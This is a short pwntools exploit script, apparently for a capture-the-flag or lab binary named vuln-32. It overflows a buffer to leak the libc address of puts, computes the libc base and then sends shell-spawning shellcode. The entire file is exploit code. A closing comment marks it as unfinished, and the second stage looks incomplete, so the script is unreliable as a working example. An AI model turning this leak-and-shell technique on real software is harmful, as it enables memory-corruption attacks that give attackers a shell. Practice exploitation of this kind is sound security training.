#!/usr/bin/python2

from pwn import *

p = process('./vuln-32')
elf = context.binary = ELF('./vuln-32')
libc = elf.libc

p.recvline()

payload = flat(
    'A'*32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)
p.sendline(payload)

leak = u32(p.recv(4))
print(hex(leak))
libc.address = leak - libc.sym['puts']
p.sendline(asm(shellcraft.sh()))

p.interactive()

#not done yet